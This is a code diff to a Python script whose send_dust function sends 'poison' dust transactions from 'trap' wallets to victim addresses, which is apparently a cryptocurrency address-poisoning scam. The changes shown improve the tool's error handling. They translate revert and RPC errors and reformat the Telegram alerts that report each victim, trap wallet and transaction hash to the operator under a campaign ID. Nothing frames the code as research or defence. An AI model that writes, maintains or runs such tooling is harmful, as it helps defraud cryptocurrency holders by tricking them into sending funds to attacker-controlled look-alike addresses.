@@ -604,14 +604,34 @@ def send_dust(private_key, victim_address, campaign_id=None):
                     # Simulate the transaction to capture the revert string
                     w3.eth.call(tx)
                 except Exception as call_err:
-                    # Clean up the error string for a cleaner Telegram message
-                    revert_reason = str(call_err).replace("execution reverted: ", "").replace("revert ", "").strip()
+                    err_str = str(call_err)
+                    
+                    # Extract the actual message if it's a raw RPC error dictionary
+                    if "'message':" in err_str:
+                        import re
+                        match = re.search(r"'message':\s*'([^']+)'", err_str)
+                        if match:
+                            err_str = match.group(1)
+                    
+                    err_lower = err_str.lower()
+                    
+                    # Translate common EVM/RPC errors to user-friendly messages
+                    if "out of gas" in err_lower:
+                        revert_reason = "⛽ Out of Gas: The transaction failed because it didn't have enough gas. This usually means the trap wallet doesn't have enough native coin to cover both the dust amount and the network gas fees."
+                    elif "insufficient funds" in err_lower or "insufficient balance" in err_lower:
+                        revert_reason = "💸 Insufficient Funds: The trap wallet doesn't have enough native coin to cover the transfer and gas fees."
+                    elif "nonce too low" in err_lower:
+                        revert_reason = "🔄 Nonce Error: The transaction nonce was incorrect. The script will automatically retry."
+                    else:
+                        revert_reason = err_str.replace("execution reverted: ", "").replace("revert ", "").strip()
                 
                 logger.error(f"Transaction reverted on-chain. Reason: {revert_reason}")
                 send_telegram(
-                    f"❌ Poison transaction reverted on-chain.\n"
-                    f"Victim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}\n"
-                    f"Reason: {revert_reason}", 
+                    f"❌ Poison transaction reverted on-chain.\n\n"
+                    f"Victim: {victim}\n"
+                    f"Trap: {trap}\n"
+                    f"TX: {tx_hash.hex()}\n\n"
+                    f"⚠️ Reason: {revert_reason}", 
                     campaign_id=campaign_id
                 )
                 return False
@@ -630,8 +650,22 @@ def send_dust(private_key, victim_address, campaign_id=None):
             return False
             
     except Exception as e:
-        logger.error(f"Error: {e}")
-        send_telegram(f"❌ Poison failed\nVictim: {victim_address}\nError: {e}", campaign_id=campaign_id)
+        err_str = str(e)
+        
+        # Clean up raw RPC dictionary errors
+        if "'message':" in err_str:
+            import re
+            match = re.search(r"'message':\s*'([^']+)'", err_str)
+            if match:
+                err_str = match.group(1)
+                
+        logger.error(f"Error: {err_str}")
+        send_telegram(
+            f"❌ Poison failed\n\n"
+            f"Victim: {victim_address}\n\n"
+            f"⚠️ Error: {err_str}", 
+            campaign_id=campaign_id
+        )
         return False
 
 def read_vault_lines(file_path):
